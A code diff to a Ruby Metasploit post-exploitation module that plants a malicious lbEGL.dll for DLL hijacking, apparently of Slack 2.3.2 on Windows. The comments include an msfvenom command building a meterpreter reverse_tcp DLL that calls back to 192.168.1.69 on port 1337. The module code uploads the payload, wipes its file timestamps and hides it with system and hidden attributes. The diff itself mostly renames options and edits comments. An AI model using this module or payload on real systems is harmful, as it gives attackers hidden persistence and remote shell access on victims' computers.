@@ -22,7 +22,7 @@
 # service will run the malicious executable with elevated privileges.
 # "WARNING: This module will not delete the payload deployed"
 #
-# [ BUILD SERVICE EXECUTABLE ]
+# [ BUILD MALICIOUS DLL ]
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f dll -o lbEGL.dll
 #
 #
@@ -30,7 +30,7 @@
 # [ MODULE DEFAULT OPTIONS ]
 # The session number to run this module on        => set SESSION 3
 # The full path (local) of payload to be uploaded => set LOCAL_PATH /root/lbEGL.dll
-# Revert lbEGL.dll tois default stage             => set REVERT_HIJACK true
+# Revert lbEGL.dll to is default stage?           => set REVERT_HIJACK true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -98,7 +98,7 @@ class MetasploitModule < Msf::Post
                         'Privileged'     => 'false',
                         'Targets'        =>
                                 [
-                                         # 
+                                         # tested on: windows 7 ultimate (32 bits)
                                          [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                 ],
                         'DefaultTarget'  => '3', # default its to run againts windows 7 ultimate (32 bits)
@@ -120,7 +120,7 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('UPLOAD_PATH', [ false, 'The full path of your lbEGL.dll to be uploaded'])
+                                OptString.new('LOCAL_PATH', [ false, 'The full path of lbEGL.dll to upload (eg /root/lbEGL.dll)'])
                         ], self.class)
 
                 register_advanced_options(
@@ -187,7 +187,6 @@ def ls_stage1
         client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
         sleep(1.5)
 
-
       # change attributes of lbEGL.dll to hidde it from site...
       r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
@@ -199,7 +198,7 @@ def ls_stage1
           sleep(1.5)
 
         # task completed successefully...
-        print_status("slack 2.3.2 dll hijacking placed successefuly...")
+        print_status("Malicious dll placed successefuly...")
         print_status("Sart one handler and wait for connection!")
         print_line("")
 
@@ -213,6 +212,16 @@ def ls_stage1
 end
 
 
+
+
+
+
+# --------------------------------------
+# REVERT MALICIOUS DLL TO ORIGINAL STATE
+# --------------------------------------
+def ls_stage2
+ print_error("under develop")
+end
 
 
 
@@ -252,7 +261,7 @@ def run
 # ------------------------------------
 # Selected settings to run
 # ------------------------------------
-      if datastore['UPLOAD_PATH']
+      if datastore['LOCAL_PATH']
          ls_stage1
       end
 
